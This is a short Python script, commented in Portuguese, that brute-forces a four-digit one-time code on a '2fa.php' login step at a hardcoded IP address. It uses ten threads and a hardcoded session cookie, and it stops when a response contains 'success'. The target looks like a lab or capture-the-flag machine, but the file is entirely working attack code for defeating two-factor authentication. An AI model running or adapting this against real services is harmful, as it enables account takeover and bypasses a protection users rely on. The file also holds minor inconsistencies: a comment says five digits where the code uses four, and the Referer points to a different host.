import requests
from concurrent.futures import ThreadPoolExecutor

# URL do destino
url = "http://83.136.254.158:51829/2fa.php"

# Cabeçalhos HTTP
headers = {
    "Host": "83.136.254.158:51829",
    "Cache-Control": "max-age=0",
    "Accept-Language": "pt-BR,pt;q=0.9",
    "Origin": "http://83.136.254.158:51829",
    "Content-Type": "application/x-www-form-urlencoded",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": "http://83.136.251.170:47490/2fa.php",
    "Accept-Encoding": "gzip, deflate, br",
    "Cookie": "PHPSESSID=avalq9kov4s9qg5iph5jikrpqo",
    "Connection": "keep-alive"
}

# Cria uma sessão para reutilizar conexões
session = requests.Session()
session.headers.update(headers)

# Função para tentar um código de 4 dígitos
def try_code(otp):
    data = {
        "otp": otp
    }
    
    try:
        # Faz a requisição POST
        response = session.post(url, data=data)
        
        # Verifica se a resposta indica sucesso (personalize conforme necessário)
        if "success" in response.text.lower():  # Dependendo da resposta do servidor
            print(f"Código correto encontrado: {otp}")
            return True  # Código correto encontrado
    except requests.RequestException as e:
        print(f"Erro com o código {otp}: {e}")
    return False

# Função para testar um intervalo de códigos
def test_range(start, end):
    for i in range(start, end):
        otp = f"{i:04d}"  # Formata o número para ser sempre 5 dígitos
        if try_code(otp):
            return otp  # Retorna o código correto
    return None

# Função principal para realizar as tentativas
def main():
    # Define quantas threads usar (ajuste conforme o desempenho do seu sistema)
    threads = 10
    
    # Dividir o intervalo de 0000 a 9999 entre as threads
    chunk_size = 10000 // threads
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for i in range(0, 10000, chunk_size):
            futures.append(executor.submit(test_range, i, min(i + chunk_size, 10000)))
        
        # Verifica os resultados
        for future in futures:
            result = future.result()
            if result:
                print(f"Código encontrado: {result}")
                break

if __name__ == "__main__":
    main()

